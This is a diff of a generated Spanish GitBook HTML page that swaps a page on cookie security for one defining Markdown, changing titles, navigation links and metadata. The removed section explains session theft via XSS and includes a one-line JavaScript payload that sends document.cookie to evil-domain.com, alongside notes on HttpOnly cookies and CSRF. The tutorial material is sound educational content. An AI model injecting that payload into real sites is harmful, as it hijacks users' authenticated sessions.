@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Seguridad · GitBook</title>
+        <title>Definición · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.2">
@@ -57,10 +57,8 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="seguimiento-privacidad.html" />
+    <link rel="next" href="aprendizaje.html" />
     
-    
-    <link rel="prev" href="creando-cookies.html" />
     
 
     </head>
@@ -213,9 +211,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.4.1" data-path="../markdown/definicion.html">
+        <li class="chapter active" data-level="1.4.1" data-path="definicion.html">
             
-                <a href="../markdown/definicion.html">
+                <a href="definicion.html">
             
                     
                     Definición
@@ -226,9 +224,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.4.2" data-path="../markdown/aprendizaje.html">
+        <li class="chapter " data-level="1.4.2" data-path="aprendizaje.html">
             
-                <a href="../markdown/aprendizaje.html">
+                <a href="aprendizaje.html">
             
                     
                     Aprendizaje
@@ -568,9 +566,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.9.1" data-path="definicion.html">
+        <li class="chapter " data-level="1.9.1" data-path="../http-cookies/definicion.html">
             
-                <a href="definicion.html">
+                <a href="../http-cookies/definicion.html">
             
                     
                     Definición
@@ -581,9 +579,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.9.2" data-path="creando-cookies.html">
+        <li class="chapter " data-level="1.9.2" data-path="../http-cookies/creando-cookies.html">
             
-                <a href="creando-cookies.html">
+                <a href="../http-cookies/creando-cookies.html">
             
                     
                     Creando cookies
@@ -594,9 +592,9 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.9.3" data-path="seguridad.html">
+        <li class="chapter " data-level="1.9.3" data-path="../http-cookies/seguridad.html">
             
-                <a href="seguridad.html">
+                <a href="../http-cookies/seguridad.html">
             
                     
                     Seguridad
@@ -607,9 +605,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.9.4" data-path="seguimiento-privacidad.html">
+        <li class="chapter " data-level="1.9.4" data-path="../http-cookies/seguimiento-privacidad.html">
             
-                <a href="seguimiento-privacidad.html">
+                <a href="../http-cookies/seguimiento-privacidad.html">
             
                     
                     Seguimiento y privacidad
@@ -874,7 +872,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Seguridad</a>
+        <a href=".." >Definición</a>
     </h1>
 </div>
 
@@ -889,18 +887,9 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="seguridad">Seguridad</h1>
-<h4 id="robos-de-sesiones-y-xss">Robos de sesiones y XSS</h4>
-<p>Las cookies son frecuentemente usadas para identificar a usuarios y sus sesiones autenticadas. Por lo que robar una cookie podr&#xED;a significar robar la sesi&#xF3;n de un usuario. Una forma comun de robar cookies es aprovechando la vulnerabilidad XSS de la aplicaci&#xF3;n.</p>
-<pre><code class="lang-js">(<span class="hljs-keyword">new</span> Image()).src = <span class="hljs-string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="hljs-built_in">document</span>.cookie;
-</code></pre>
-<p>Los <strong>cookies HttpOnly</strong> pueden ayudar a mitigar este ataque ya que impiden el acceso al valor de las cookies mediante c&#xF3;digo Javascript.</p>
-<h4 id="cross-site-qurest-forgery-csrf">Cross-site qurest forgery (CSRF)</h4>
-<p>O falsificaci&#xF3;n de petici&#xF3;n en sitios cruzados. Este ataque fuerza al navegador web de su v&#xED;ctima, validado en alg&#xFA;n servicio a enviar una petici&#xF3;n a una aplicaci&#xF3;n web vulnerable.</p>
-<ul>
-<li><a href="https://github.com/samyk/evercookie" target="_blank">Evercookie by Samy Kamkar</a></li>
-<li><a href="https://en.wikipedia.org/wiki/Zombie_cookie" target="_blank">Zombie cookies on Wikipedia</a></li>
-</ul>
+                                <h3 id="definici&#xF3;n">Definici&#xF3;n</h3>
+<p>Markdown es un <strong>lenguaje de marcado</strong> que facilita la aplicaci&#xF3;n de formato a un texto empleando una serie de caracteres de una forma especial. En principio, fue pensado para elaborar textos cuyo destino iba a ser la web con m&#xE1;s rapidez y sencillez que si estuvi&#xE9;semos empleando directamente HTML. Y si bien ese suele ser el mejor uso que podemos darle, tambi&#xE9;n podemos emplearlo para cualquier tipo de texto, independientemente de cual vaya a ser su destino.</p>
+<p><img src="img/markdown.png" alt="markdown"></p>
 
                                 
                                 </section>
@@ -928,12 +917,8 @@
 
             
                 
-                <a href="creando-cookies.html" class="navigation navigation-prev " aria-label="Previous page: Creando cookies">
-                    <i class="fa fa-angle-left"></i>
-                </a>
                 
-                
-                <a href="seguimiento-privacidad.html" class="navigation navigation-next " aria-label="Next page: Seguimiento y privacidad">
+                <a href="aprendizaje.html" class="navigation navigation-next navigation-unique" aria-label="Next page: Aprendizaje">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -944,7 +929,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Seguridad","level":"1.9.3","depth":2,"next":{"title":"Seguimiento y privacidad","level":"1.9.4","depth":2,"path":"http-cookies/seguimiento-privacidad.md","ref":"http-cookies/seguimiento-privacidad.md","articles":[]},"previous":{"title":"Creando cookies","level":"1.9.2","depth":2,"path":"http-cookies/creando-cookies.md","ref":"http-cookies/creando-cookies.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"http-cookies/seguridad.md","mtime":"2017-03-15T18:25:39.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-15T21:17:43.069Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Definición","level":"1.4.1","depth":2,"next":{"title":"Aprendizaje","level":"1.4.2","depth":2,"path":"markdown/aprendizaje.md","ref":"markdown/aprendizaje.md","articles":[]},"previous":{"title":"Markdown","level":"1.4","depth":1,"ref":"","articles":[{"title":"Definición","level":"1.4.1","depth":2,"path":"markdown/definicion.md","ref":"markdown/definicion.md","articles":[]},{"title":"Aprendizaje","level":"1.4.2","depth":2,"path":"markdown/aprendizaje.md","ref":"markdown/aprendizaje.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"markdown/definicion.md","mtime":"2017-02-14T13:49:58.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-15T21:17:43.069Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
